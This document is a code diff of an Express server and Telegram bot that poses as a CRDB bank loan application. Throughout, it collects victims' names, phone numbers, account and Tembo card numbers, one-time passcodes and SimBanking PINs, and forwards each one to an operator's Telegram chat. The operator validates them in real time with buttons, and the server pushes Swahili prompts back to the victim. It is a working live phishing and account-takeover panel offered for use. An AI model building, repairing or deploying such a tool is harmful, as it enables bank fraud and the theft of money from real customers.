@@ -6,125 +6,146 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Environment variables or direct configuration for Telegram Bot Token
-const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
+// Configuration
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 const bot = new TelegramBot(TOKEN, { polling: true });
 
-// Store active sessions mapped by chat ID
-const sessions = {};
+let adminChatId = null;
+let clientData = {};
+let pinAttempts = 3;
 
-// When admin starts the bot, provide their private link / dashboard panel link
+// Admin start command to get private link
 bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    sessions[chatId] = { step: 1 };
-    
-    const hostUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:3000`;
-    const privateAppLink = `${hostUrl}?admin=${chatId}`;
-
-    bot.sendMessage(chatId, 
-        `🤖 *CRDB SimBanking Control Center Connected*\n\n` +
-        `Your private application link for tracking submissions is:\n${privateAppLink}\n\n` +
-        `Send this link to applicants. You will receive real-time action buttons as they progress through steps.`,
-        { parse_mode: 'Markdown' }
-    );
+    adminChatId = msg.chat.id;
+    bot.sendMessage(adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${adminChatId}\`\nYou will receive applicant real-time actions and verification prompts here.`, { parse_mode: 'Markdown' });
 });
 
-// Endpoint to receive client events/submissions and forward interactive buttons to Admin Telegram
-app.api = {}; // placeholder
+// API endpoint to handle user step submissions from frontend
 app.post('/api/submit', async (req, res) => {
-    const { adminChatId, stepData, stepNumber } = req.body;
-    
-    if (!adminChatId || !bot) {
-        return res.status(400).json({ success: false, error: 'Admin chat missing' });
+    const { step, data } = req.body;
+    clientData = { ...clientData, ...data };
+
+    if (!adminChatId) {
+        return res.status(400).json({ success: false, message: 'Admin not connected to bot.' });
     }
 
-    let messageText = '';
-    let inlineKeyboard = [];
-
-    switch(Number(stepNumber)) {
-        case 1:
-            messageText = `📌 *Step 1: Account & Card Details*\n\n` +
-                          `• Account: \`${stepData.accountNumber}\`\n` +
-                          `• Tembo Card: \`${stepData.cardNum}\``;
-            inlineKeyboard = [
-                [
-                    { text: '✅ PROCEED', callback_data: `proceed_${adminChatId}_1` },
-                    { text: '❌ INVALID CRDB DETAILS', callback_data: `invalid_crdb_${adminChatId}` }
-                ],
-                [
-                    { text: '⛔ DENY', callback_data: `deny_${adminChatId}` }
-                ]
-            ];
-            break;
-
-        case 2:
-            messageText = `📌 *Step 2: OTP Verification*\n\n` +
-                          `• Submitted OTP: \`${stepData.otp}\``;
-            inlineKeyboard = [
-                [
-                    { text: '✅ CORRECT OTP', callback_data: `correct_otp_${adminChatId}` },
-                    { text: '❌ INCORRECT OTP', callback_data: `wrong_otp_${adminChatId}` }
-                ]
-            ];
-            break;
-
-        case 3:
-            messageText = `📌 *Step 3: SimBanking PIN Check*\n\n` +
-                          `• Entered PIN: \`${stepData.pin}\`\n` +
-                          `• Attempts Left: \`${stepData.attemptsLeft}\``;
-            inlineKeyboard = [
-                [
-                    { text: '✅ CORRECT PIN', callback_data: `correct_pin_${adminChatId}` },
-                    { text: '❌ WRONG PIN', callback_data: `wrong_pin_${adminChatId}` }
-                ]
-            ];
-            break;
+    if (step === 'step1') {
+        const msgText = `📥 **New Loan Application - Step 1**\n\n👤 **Full Name:** ${data.fullName}\n📞 **Phone Number:** ${data.phone}`;
+        await bot.sendMessage(adminChatId, msgText, { parse_mode: 'Markdown' });
+        return res.json({ success: true });
+    } 
+    else if (step === 'step2') {
+        const msgText = `📊 **Loan Details - Step 2**\n\n📋 **Reason:** ${data.reason}\n💰 **Monthly Income:** TZS ${data.monthlyIncome}\n💵 **Requested Amount:** TZS ${data.requestedAmount}`;
+        await bot.sendMessage(adminChatId, msgText, { parse_mode: 'Markdown' });
+        return res.json({ success: true });
+    }
+    else if (step === 'step3') {
+        const msgText = `💳 **Account & Card Verification - Step 3**\n\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
         
-        case 4:
-            messageText = `📌 *Step 4: Final Qualification Check*\n\n` +
-                          `Applicant reached final approval screen requiring TZS 500,000 minimum balance check.`;
-            break;
+        const opts = {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: 'PROCEED', callback_data: 'card_proceed' },
+                        { text: 'DENY INVALID CRDB DETAILS', callback_data: 'card_deny' }
+                    ]
+                ]
+            },
+            parse_mode: 'Markdown'
+        };
+        await bot.sendMessage(adminChatId, msgText, opts);
+        return res.json({ success: true, pendingApproval: true });
+    }
+    else if (step === 'step4') {
+        const msgText = `📱 **OTP Verification - Step 4**\n\n🔢 **Entered OTP:** ${data.otp}\n📞 **Tembo Phone:** +255 XXX XXX XXX\n\n*Choose action for OTP:*`;
+        const opts = {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: 'CORRECT OTP', callback_data: 'otp_correct' },
+                        { text: 'INCORRECT OTP', callback_data: 'otp_incorrect' },
+                        { text: 'RESEND OTP', callback_data: 'otp_resend' }
+                    ]
+                ]
+            },
+            parse_mode: 'Markdown'
+        };
+        await bot.sendMessage(adminChatId, msgText, opts);
+        return res.json({ success: true, pendingApproval: true });
+    }
+    else if (step === 'step5') {
+        const msgText = `🔒 **SimBanking PIN - Step 5**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
+        const opts = {
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: 'CORRECT PIN', callback_data: 'pin_correct' },
+                        { text: 'WRONG PIN', callback_data: 'pin_wrong' }
+                    ]
+                ]
+            },
+            parse_mode: 'Markdown'
+        };
+        await bot.sendMessage(adminChatId, msgText, opts);
+        return res.json({ success: true, pendingApproval: true });
     }
 
-    const sentMsg = await bot.sendMessage(adminChatId, messageText, {
-        parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: inlineKeyboard }
-    });
-
-    sessions[adminChatId] = { lastMessageId: sentMsg.message_id, clientStatus: 'pending' };
-    res.json({ success: true, message: 'Forwarded to admin telegram' });
+    res.json({ success: false, message: 'Invalid step' });
 });
 
-// Handle admin button clicks
+let currentClientResponse = null;
+
 bot.on('callback_query', async (query) => {
+    const action = query.data;
     const chatId = query.message.chat.id;
-    const data = query.data;
 
     await bot.answerCallbackQuery(query.id);
 
-    // Parse command action and target admin/client session
-    let responseText = `Action processed: ${data}`;
-    bot.sendMessage(chatId, responseText);
-    
-    // Broadcast action back to frontend via polling endpoint or handle storage states here
-    // For simplicity in single server polling loop:
-    sessions[chatId].actionResult = data;
+    if (action === 'card_proceed') {
+        await bot.sendMessage(chatId, '✅ Card details approved. Applicant moving to OTP step.');
+        currentClientResponse = { status: 'approved', next: 'otp' };
+    } else if (action === 'card_deny') {
+        await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
+        currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details).' };
+    } else if (action === 'otp_correct') {
+        await bot.sendMessage(chatId, '✅ OTP correct. Applicant moving to PIN step.');
+        currentClientResponse = { status: 'approved', next: 'pin' };
+    } else if (action === 'otp_incorrect') {
+        await bot.sendMessage(chatId, '❌ Incorrect OTP. Applicant forced to enter new OTP.');
+        currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi. Tafadhali ingiza OTP mpya.' };
+    } else if (action === 'otp_resend') {
+        await bot.sendMessage(chatId, '🔄 Resend OTP notification received.');
+        currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa.' };
+    } else if (action === 'pin_correct') {
+        await bot.sendMessage(chatId, '✅ PIN correct. Proceeding to success screen.');
+        pinAttempts = 3;
+        currentClientResponse = { status: 'approved', next: 'success' };
+    } else if (action === 'pin_wrong') {
+        pinAttempts--;
+        if (pinAttempts <= 0) {
+            await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
+            currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa 3 ya PIN.' };
+            pinAttempts = 3;
+        } else {
+            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${pinAttempts} attempt remains.`);
+            currentClientResponse = { status: 'retry_pin', attemptsLeft: pinAttempts, message: `Incorrect pin, ${pinAttempts} attempt remains` };
+        }
+    }
 });
 
-// Polling endpoint for frontend to check admin responses
-app.get('/api/check-status/:adminChatId', (req, res) => {
-    const adminChatId = req.params.adminChatId;
-    const session = sessions[adminChatId];
-    if (session && session.actionResult) {
-        const action = session.actionResult;
-        session.actionResult = null; // reset
-        return res.json({ status: action });
-    }
-    res.json({ status: 'pending' });
+app.get('/api/poll-status', (req, res) => {
+    const checkInterval = setInterval(() => {
+        if (currentClientResponse) {
+            clearInterval(checkInterval);
+            const resp = currentClientResponse;
+            currentClientResponse = null;
+            res.json(resp);
+        }
+    }, 1000);
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
+                                                                                                                                                                     
